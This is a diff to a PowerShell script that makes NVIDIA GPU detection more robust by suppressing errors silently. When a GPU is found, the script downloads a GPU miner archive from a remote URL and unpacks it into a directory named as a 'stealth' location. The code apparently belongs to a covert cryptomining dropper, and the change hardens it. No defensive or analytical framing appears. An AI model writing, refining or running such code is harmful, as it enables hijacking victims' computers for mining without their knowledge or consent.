@@ -30,7 +30,14 @@ try {
     }
 
     # 2. Check for NVIDIA GPU & Handle GPU Miner
-    $GpuDetected = Get-CimInstance Win32_VideoController | Where-Object { $_.Name -match "NVIDIA" -or $_.PNPDeviceID -match "VEN_10DE" }
+    $GpuDetected = $null
+    try {
+        $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
+        if ($vc) {
+            $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.PNPDeviceID -match "VEN_10DE" }
+        }
+    } catch { }
+
     if ($GpuDetected -and -not (Test-Path $GpuExe)) {
         $wc.DownloadFile($GpuMinerUrl, $GpuZip)
         Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
